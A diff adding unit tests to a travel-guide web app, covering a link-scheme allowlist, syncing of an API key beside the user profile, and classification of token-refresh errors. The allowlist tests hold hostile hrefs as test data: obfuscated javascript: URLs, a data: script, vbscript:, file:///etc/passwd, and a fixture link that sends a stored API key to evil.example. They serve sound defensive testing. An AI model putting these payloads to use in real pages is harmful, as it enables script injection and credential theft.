@@ -2506,5 +2506,186 @@ test('the shipped cities carry structured ratings for the badge to render', () =
   });
 });
 
+// ---- link scheme allowlist ----
+
+test('safeHref allows the schemes a travel link legitimately uses', () => {
+  const ok = [
+    'https://maps.google.com/?cid=895365817124148954',
+    'http://example.com/place',
+    'HTTPS://EXAMPLE.COM',
+    'tel:+995555123456',
+    'mailto:hello@example.com',
+    'geo:41.64,41.61',
+    '/relative/path',
+    'relative/path?q=1',
+    '#anchor',
+    'place/x:1',                 // colon inside a path, not a scheme
+    '//cdn.example.com/x'        // scheme-relative: inherits http(s) here
+  ];
+  ok.forEach((h) => assert.equal(C.safeHref(h), h, 'should allow ' + h));
+});
+
+test('safeHref refuses every scheme that can execute or smuggle content', () => {
+  const bad = [
+    'javascript:alert(1)',
+    'JavaScript:alert(1)',
+    '  javascript:alert(1)  ',       // leading space is trimmed before parsing
+    'java\tscript:alert(1)',         // browsers ignore control chars in a scheme
+    'java\nscript:alert(1)',
+    'jav ascript:alert(1)',
+    'data:text/html;base64,PHNjcmlwdD4=',
+    'vbscript:msgbox(1)',
+    'file:///etc/passwd',
+    'blob:https://example.com/abc',
+    '',
+    '   ',
+    null,
+    undefined,
+    42
+  ];
+  bad.forEach((h) => assert.equal(C.safeHref(h), null, 'should refuse ' + String(h)));
+});
+
+test('a hostile link in guide JSON validates but never goes live in the DOM', () => {
+  // The guide is untrusted input: it is pasted from an AI, imported from a
+  // file, or pulled from a sync row. This is the whole point of the
+  // allowlist, so it is asserted on a city that is otherwise perfectly valid.
+  const hostile = JSON.parse(JSON.stringify(GOOD));
+  hostile.items[0].links = [
+    { kind: 'web', label: 'Book a table', href: 'javascript:fetch("https://evil.example/"+localStorage.getItem("cityops.claude.apikey.v1"))' },
+    { kind: 'map', label: 'Open in Maps', href: 'https://maps.google.com/?cid=1' }
+  ];
+  assert.deepEqual(C.validate(hostile), []);          // the validator still accepts it
+  assert.equal(C.safeHref(hostile.items[0].links[0].href), null);   // the renderer will not
+  assert.equal(C.safeHref(hostile.items[0].links[1].href), 'https://maps.google.com/?cid=1');
+});
+
+// ---- profile row: the Claude key and form metadata as stamped sidecars ----
+
+const P_LOCAL = '2026-08-20T10:00:00.000Z';
+const P_REMOTE = '2026-08-21T10:00:00.000Z';
+
+test('buildProfileRow carries the key beside the profile, never inside it', () => {
+  const row = C.syncKit.buildProfileRow(
+    { interests: ['coffee'], updated: P_LOCAL },
+    { apiKey: { value: 'sk-ant-secret', updated: P_REMOTE } });
+  assert.equal(row.data.apiKey.value, 'sk-ant-secret');
+  assert.equal(row.data.apiKey.updated, P_REMOTE);
+  assert.deepEqual(row.data.interests, ['coffee']);
+  // The ROW stamp stays the profile's own: a key change must not let an
+  // otherwise stale profile win a reconcile it would lose on its merits.
+  assert.equal(row.updated_at, P_LOCAL);
+});
+
+test('a profile with no stamp and no sidecars still builds a row at the epoch', () => {
+  const row = C.syncKit.buildProfileRow(null, null);
+  assert.equal(row.updated_at, C.syncKit.EPOCH);
+  assert.equal(row.data.updated, null);
+  assert.equal(row.data.apiKey, undefined);   // absent, never an empty block
+  assert.equal(row.data.genmeta, undefined);
+});
+
+test('a sidecar with no stamp is treated as absent, not as an empty value', () => {
+  // A block with no stamp cannot be reconciled against anything, so writing
+  // it would silently beat a real one on the next pull.
+  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL },
+    { apiKey: { value: 'sk-ant-x' }, genmeta: { value: { a: { notes: 'x' } } } });
+  assert.equal(row.data.apiKey, undefined);
+  assert.equal(row.data.genmeta, undefined);
+});
+
+test('the Claude key cannot survive a round trip into the interest profile', () => {
+  // This is the guarantee the whole design rests on: normalizeProfile rebuilds
+  // from a fixed field list, so a pulled row's sidecars can never reach
+  // store.profile, and from there a prompt, an export or a city row.
+  const row = C.syncKit.buildProfileRow({ interests: ['ramen'], updated: P_LOCAL },
+    { apiKey: { value: 'sk-ant-secret', updated: P_LOCAL },
+      genmeta: { value: { 'batumi-2026-08-08': { notes: 'top floor' } }, updated: P_LOCAL } });
+  const back = C.profile.normalize(row.data);
+  assert.equal(back.apiKey, undefined);
+  assert.equal(back.genmeta, undefined);
+  assert.deepEqual(Object.keys(back).sort(),
+    ['avoid', 'factors', 'interests', 'notes', 'schema', 'showExample', 'updated']);
+  // And the prompt built from that profile carries no trace of either.
+  const prompt = C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, back);
+  assert.equal(prompt.indexOf('sk-ant-secret'), -1);
+  assert.equal(prompt.indexOf('top floor'), -1);
+});
+
+test('an exported guide carries no sidecar, because the export never sees one', () => {
+  const out = C.buildExport(GOOD, C.emptyState());
+  assert.equal(JSON.stringify(out).indexOf('apiKey'), -1);
+  assert.equal(JSON.stringify(out).indexOf('sk-ant'), -1);
+});
+
+test('readSidecars tolerates every shape a stored row can be in', () => {
+  assert.deepEqual(C.syncKit.readSidecars(null), { apiKey: null, genmeta: null });
+  assert.deepEqual(C.syncKit.readSidecars({}), { apiKey: null, genmeta: null });
+  assert.deepEqual(C.syncKit.readSidecars({ apiKey: 'sk-ant-loose' }), { apiKey: null, genmeta: null });
+  assert.deepEqual(C.syncKit.readSidecars({ apiKey: [] }), { apiKey: null, genmeta: null });
+  const good = C.syncKit.readSidecars({ apiKey: { value: 'sk', updated: P_LOCAL } });
+  assert.deepEqual(good.apiKey, { value: 'sk', updated: P_LOCAL });
+  // A cleared key is a real value: it has to propagate, so an empty string
+  // with a stamp is a usable block, not an absent one.
+  const cleared = C.syncKit.readSidecars({ apiKey: { value: '', updated: P_LOCAL } });
+  assert.deepEqual(cleared.apiKey, { value: '', updated: P_LOCAL });
+});
+
+test('genmeta normalizes to string fields per city and stays bounded', () => {
+  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL }, {
+    genmeta: {
+      updated: P_LOCAL,
+      value: {
+        'batumi-2026-08-08': { country: 'GE', notes: 'x'.repeat(5000), bad: { nested: 1 } },
+        'junk': 'not an object',
+        '': { notes: 'no city id' }
+      }
+    }
+  });
+  const gm = row.data.genmeta.value;
+  assert.deepEqual(Object.keys(gm), ['batumi-2026-08-08']);
+  assert.equal(gm['batumi-2026-08-08'].country, 'GE');
+  assert.equal(gm['batumi-2026-08-08'].notes.length, 2000);
+  assert.equal(gm['batumi-2026-08-08'].bad, undefined);
+});
+
+test('an oversized key value is bounded rather than pushed whole', () => {
+  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL },
+    { apiKey: { value: 'k'.repeat(9999), updated: P_LOCAL } });
+  assert.equal(row.data.apiKey.value.length, 4000);
+});
+
+// ---- token refresh: transient failure must not sign a device out ----
+
+test('refreshFailure only calls a grant dead when the body says so', () => {
+  // The first entry is the body the live project actually returned for a
+  // bogus refresh token on 2026-08-25. It is here because the first version
+  // of this classifier did not match it: a genuinely revoked session would
+  // have kept retrying forever and never told the traveler sync had stopped.
+  const dead = [
+    [400, '{"code":400,"error_code":"validation_failed","msg":"Refresh token is not valid"}'],
+    [400, '{"code":400,"error_code":"refresh_token_not_found","msg":"Invalid Refresh Token: Refresh Token Not Found"}'],
+    [400, '{"code":400,"error_code":"refresh_token_already_used","msg":"Invalid Refresh Token: Already Used"}'],
+    [400, '{"error":"invalid_grant","error_description":"Invalid Refresh Token"}'],
+    [401, '{"error":"invalid_grant"}'],
+    [403, '{"error":"invalid_grant"}']
+  ];
+  dead.forEach(([s, b]) => assert.equal(C.syncKit.refreshFailure(s, b), 'dead',
+    'should be dead: ' + s + ' ' + b));
+  const transient = [
+    [403, '{"message":"Project is paused"}'],
+    [429, '{"message":"rate limit"}'],
+    [500, ''],
+    [502, 'bad gateway'],
+    [503, '{"error":"unavailable"}'],
+    [400, ''],                                  // unreadable body: keep the session
+    [401, '{"message":"No API key found in request"}'],
+    [404, '{"message":"not found"}'],
+    [undefined, '']
+  ];
+  transient.forEach(([s, b]) => assert.equal(C.syncKit.refreshFailure(s, b), 'transient',
+    'should be transient: ' + s + ' ' + b));
+});
+
 console.log(pass + ' passed, ' + fail + ' failed');
 if (fail) process.exit(1);
